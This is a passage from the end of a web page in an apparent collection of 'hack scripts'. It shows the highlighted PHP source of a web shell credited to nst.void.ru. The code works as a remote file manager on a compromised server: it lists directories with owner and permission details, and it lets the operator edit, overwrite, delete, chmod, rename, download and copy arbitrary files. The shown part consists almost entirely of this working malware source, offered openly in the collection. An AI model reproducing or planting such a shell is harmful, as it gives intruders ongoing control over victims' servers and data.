class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;rename=1&amp;wich_f=$e&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Rename</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;]</span> <span class="p">[</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;chmod=1&amp;wich_f=$e&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">CHMOD</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;]</span> <span class="p">[</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d&amp;ccopy_to=$e&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Copy</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;]</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="si">$filename</span><span class="s2">=&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$ef</span><span class="s2">&quot;;</span>
<span class="si">$fd</span><span class="s2"> = @fopen (</span><span class="si">$filename</span><span class="s2">, &quot;</span><span class="nx">r</span><span class="s2">&quot;);</span>
<span class="si">$c</span><span class="s2"> = @fread (</span><span class="si">$fd</span><span class="s2">, @filesize (</span><span class="si">$filename</span><span class="s2">));</span>
<span class="si">$c</span><span class="s2">=htmlspecialchars(</span><span class="si">$c</span><span class="s2">);</span>
<span class="si">$de</span><span class="s2">=</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$ef</span><span class="s2">;</span>
<span class="si">$de</span><span class="s2">=str_replace(&quot;</span><span class="c1">//&quot;,&quot;/&quot;,$de);</span>
<span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">Edit:&amp;lt;br&amp;gt;</span>
<span class="si">$de</span><span class="s2">&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save&#39;</span><span class="p">]){</span>
<span class="k">print</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">&amp;lt;input name=filename value=&#39;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$ef</span><span class="s2">&#39;&amp;gt;</span>
<span class="s2">&amp;lt;textarea cols=143 rows=30 name=editf&amp;gt;</span><span class="si">$c</span><span class="s2">&amp;lt;/textarea&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit name=save value=&#39;Save changes&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save&#39;</span><span class="p">]){</span>
<span class="nv">$editf</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;editf&#39;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nb">get_magic_quotes_runtime</span><span class="p">()</span> <span class="k">or</span> <span class="nb">get_magic_quotes_gpc</span><span class="p">()){</span>
<span class="nv">$editf</span><span class="o">=</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$editf</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$f</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s2">&quot;w+&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$editf</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;b&amp;gt;File edited.&amp;lt;/b&amp;gt;</span>
<span class="s2">&amp;lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">0;URL=</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$ef\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">exit;</span>
<span class="s2">}</span>
<span class="s2">echo </span><span class="si">$copyr</span><span class="s2">;</span>
<span class="s2">exit;</span>
<span class="s2">}</span>



<span class="s2">echo&quot;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">table</span> <span class="nx">width</span><span class="o">=</span><span class="mi">100</span><span class="o">%</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="mi">1</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="mi">0</span> <span class="nx">class</span><span class="o">=</span><span class="nx">hack</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="c1">#519A00&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Filename&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#519A00&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Tools&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#519A00&amp;gt;&amp;lt;b&amp;gt;Size&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#519A00&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Owner/Group&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#519A00&amp;gt;&amp;lt;b&amp;gt;Perms&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&quot;;</span>
<span class="si">$dirs</span><span class="s2">=array();</span>
<span class="si">$files</span><span class="s2">=array();</span>
<span class="si">$dh</span><span class="s2"> = @opendir(</span><span class="si">$d</span><span class="s2">) or die(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">table</span> <span class="nx">width</span><span class="o">=</span><span class="mi">100</span><span class="o">%&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Permission</span> <span class="nx">Denied</span> <span class="k">or</span> <span class="nx">Folder</span><span class="o">/</span><span class="nx">Disk</span> <span class="nx">does</span> <span class="k">not</span> <span class="nx">exist</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$copyr</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">table</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">while (!((</span><span class="si">$file</span><span class="s2"> = readdir(</span><span class="si">$dh</span><span class="s2">)) === false)) {</span>
<span class="s2">if (</span><span class="si">$file</span><span class="s2">==&quot;</span><span class="o">.</span><span class="s2">&quot; || </span><span class="si">$file</span><span class="s2">==&quot;</span><span class="o">..</span><span class="s2">&quot;) continue;</span>
<span class="s2">if (@is_dir(&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$file</span><span class="s2">&quot;)) {</span>
<span class="s2">      </span><span class="si">$dirs</span><span class="s2">[]=</span><span class="si">$file</span><span class="s2">;</span>
<span class="s2">}else{</span>
<span class="s2">      </span><span class="si">$files</span><span class="s2">[]=</span><span class="si">$file</span><span class="s2">;</span>
<span class="s2">      }</span>
<span class="s2">   sort(</span><span class="si">$dirs</span><span class="s2">);</span>
<span class="s2">   sort(</span><span class="si">$files</span><span class="s2">);</span>

<span class="si">$fz</span><span class="s2">=@filesize(&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$file</span><span class="s2">&quot;);</span>
<span class="s2">}</span>

<span class="s2">function perm(</span><span class="si">$perms</span><span class="s2">){</span>
<span class="s2">if ((</span><span class="si">$perms</span><span class="s2"> &amp; 0xC000) == 0xC000) {</span>
<span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;s&#39;;</span>
<span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0xA000) == 0xA000) {</span>
<span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;l&#39;;</span>
<span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x8000) == 0x8000) {</span>
<span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;-&#39;;</span>
<span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x6000) == 0x6000) {</span>
<span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;b&#39;;</span>
<span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x4000) == 0x4000) {</span>
<span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;d&#39;;</span>
<span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x2000) == 0x2000) {</span>
<span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;c&#39;;</span>
<span class="s2">} elseif ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x1000) == 0x1000) {</span>
<span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;p&#39;;</span>
<span class="s2">} else {</span>
<span class="s2">   </span><span class="si">$info</span><span class="s2"> = &#39;u&#39;;</span>
<span class="s2">}</span>
<span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0100) ? &#39;r&#39; : &#39;-&#39;);</span>
<span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0080) ? &#39;w&#39; : &#39;-&#39;);</span>
<span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0040) ?</span>
<span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0800) ? &#39;s&#39; : &#39;x&#39; ) :</span>
<span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0800) ? &#39;S&#39; : &#39;-&#39;));</span>
<span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0020) ? &#39;r&#39; : &#39;-&#39;);</span>
<span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0010) ? &#39;w&#39; : &#39;-&#39;);</span>
<span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0008) ?</span>
<span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0400) ? &#39;s&#39; : &#39;x&#39; ) :</span>
<span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0400) ? &#39;S&#39; : &#39;-&#39;));</span>
<span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0004) ? &#39;r&#39; : &#39;-&#39;);</span>
<span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0002) ? &#39;w&#39; : &#39;-&#39;);</span>
<span class="si">$info</span><span class="s2"> .= ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0001) ?</span>
<span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0200) ? &#39;t&#39; : &#39;x&#39; ) :</span>
<span class="s2">           ((</span><span class="si">$perms</span><span class="s2"> &amp; 0x0200) ? &#39;T&#39; : &#39;-&#39;));</span>
<span class="s2">return </span><span class="si">$info</span><span class="s2">;</span>
<span class="s2">}</span>


<span class="s2">for(</span><span class="si">$i</span><span class="s2">=0; </span><span class="si">$i</span><span class="s2">&amp;lt;count(</span><span class="si">$dirs</span><span class="s2">); </span><span class="si">$i</span><span class="s2">++){</span>

<span class="si">$perms</span><span class="s2"> = @fileperms(</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$dirs[$i]</span><span class="s2">);</span>
<span class="si">$owner</span><span class="s2"> = @fileowner(</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$dirs[$i]</span><span class="s2">);</span>
<span class="s2">if(</span><span class="si">$os</span><span class="s2">==&quot;</span><span class="nx">unix</span><span class="s2">&quot;){</span>
<span class="si">$fileownera</span><span class="s2">=posix_getpwuid(</span><span class="si">$owner</span><span class="s2">);</span>
<span class="si">$owner</span><span class="s2">=</span><span class="si">$fileownera[&#39;name&#39;]</span><span class="s2">;</span>
<span class="s2">}</span>
<span class="si">$group</span><span class="s2"> = @filegroup(</span><span class="si">$d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$dirs[$i]</span><span class="s2">);</span>
<span class="s2">if(</span><span class="si">$os</span><span class="s2">==&quot;</span><span class="nx">unix</span><span class="s2">&quot;){</span>
<span class="si">$groupinfo</span><span class="s2"> = posix_getgrgid(</span><span class="si">$group</span><span class="s2">);</span>
<span class="si">$group</span><span class="s2">=</span><span class="si">$groupinfo[&#39;name&#39;]</span><span class="s2">;</span>
<span class="s2">}</span>
<span class="si">$info</span><span class="s2">=perm(</span><span class="si">$perms</span><span class="s2">);</span>
<span class="s2">if(</span><span class="si">$i</span><span class="s2">%2)</span><span class="si">{</span><span class="nv">$color</span><span class="o">=</span><span class="s2">&quot;#D7FFA8&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2">else</span><span class="si">{</span><span class="nv">$color</span><span class="o">=</span><span class="s2">&quot;#D1D1D1&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="si">$linkd</span><span class="s2">=&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d/$dirs[$i]&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dirs</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="si">$linkd</span><span class="s2">=str_replace(&quot;</span><span class="c1">//&quot;,&quot;/&quot;,$linkd);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&amp;gt;&amp;lt;font face=wingdings size=2&amp;gt;0&amp;lt;/font&amp;gt; </span><span class="si">$linkd</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&amp;gt;&amp;lt;center&amp;gt;&amp;lt;font color=blue&amp;gt;DIR&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&amp;gt;&amp;lt;center&amp;gt;</span><span class="si">$owner</span><span class="s2">/</span><span class="si">$group</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&amp;gt;</span><span class="si">$info</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$files</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>

<span class="nv">$size</span><span class="o">=@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$files</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="nv">$perms</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$files</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="nv">$owner</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$files</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span>
<span class="nv">$fileownera</span><span class="o">=</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$owner</span><span class="p">);</span>
<span class="nv">$owner</span><span class="o">=</span><span class="nv">$fileownera</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="p">}</span>
<span class="nv">$group</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$files</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span>
<span class="nv">$groupinfo</span> <span class="o">=</span> <span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nv">$group</span><span class="p">);</span>
<span class="nv">$group</span><span class="o">=</span><span class="nv">$groupinfo</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="p">}</span>
<span class="nv">$info</span><span class="o">=</span><span class="nx">perm</span><span class="p">(</span><span class="nv">$perms</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">%</span><span class="mi">2</span><span class="p">){</span><span class="nv">$color</span><span class="o">=</span><span class="s2">&quot;#D1D1D1&quot;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nv">$color</span><span class="o">=</span><span class="s2">&quot;#D7FFA8&quot;</span><span class="p">;}</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">1024</span><span class="p">){</span><span class="nv">$siz</span><span class="o">=</span><span class="nv">$size</span><span class="o">.</span><span class="s1">&#39; b&#39;</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">){</span><span class="nv">$siz</span><span class="o">=</span><span class="nb">number_format</span><span class="p">((</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1024</span><span class="p">),</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; kb&#39;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">1000000000</span><span class="p">){</span><span class="nv">$siz</span><span class="o">=</span><span class="nb">number_format</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="p">(</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">),</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; mb&#39;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">1000000000000</span><span class="p">){</span><span class="nv">$siz</span><span class="o">=</span><span class="nb">number_format</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="p">(</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">),</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; gb&#39;</span><span class="p">;}</span>
<span class="p">}}}</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&amp;gt;&amp;lt;font face=wingdings size=3&amp;gt;2&amp;lt;/font&amp;gt; &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$files[$i]</span><span class="s2">&#39;&amp;gt;</span><span class="si">$files[$i]</span><span class="s2">&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&amp;gt;&amp;lt;center&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">javascript:ShowOrHide(&#39;</span><span class="si">$i</span><span class="s2">&#39;,&#39;&#39;)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[options]&amp;lt;/a&amp;gt;&amp;lt;div id=&#39;</span><span class="si">$i</span><span class="s2">&#39; style=&#39;display:none;z-index:1;&#39; &amp;gt;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ef=</span><span class="si">$files[$i]</span><span class="s2">&amp;edit=1&#39; title=&#39;Edit </span><span class="si">$files[$i]</span><span class="s2">&#39;&amp;gt;&amp;lt;b&amp;gt;Edit&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;del_f=1&amp;wich_f=</span><span class="si">$files[$i]</span><span class="s2">&#39; title=&#39;Delete </span><span class="si">$files[$i]</span><span class="s2">&#39;&amp;gt;&amp;lt;b&amp;gt;Delete&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;chmod=1&amp;wich_f=</span><span class="si">$files[$i]</span><span class="s2">&#39; title=&#39;chmod </span><span class="si">$files[$i]</span><span class="s2">&#39;&amp;gt;&amp;lt;b&amp;gt;CHMOD&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;rename=1&amp;wich_f=</span><span class="si">$files[$i]</span><span class="s2">&#39; title=&#39;Rename </span><span class="si">$files[$i]</span><span class="s2">&#39;&amp;gt;&amp;lt;b&amp;gt;Rename&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;download=</span><span class="si">$files[$i]</span><span class="s2">&#39; title=&#39;Download </span><span class="si">$files[$i]</span><span class="s2">&#39;&amp;gt;&amp;lt;b&amp;gt;Download&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ccopy_to=</span><span class="si">$files[$i]</span><span class="s2">&#39; title=&#39;Copy </span><span class="si">$files[$i]</span><span class="s2"> to?&#39;&amp;gt;&amp;lt;b&amp;gt;Copy&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&amp;gt;</span><span class="si">$siz</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&amp;gt;&amp;lt;center&amp;gt;</span><span class="si">$owner</span><span class="s2">/</span><span class="si">$group</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&amp;gt;</span><span class="si">$info</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;!-- Network security team :: nst.void.ru --&amp;gt;</span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
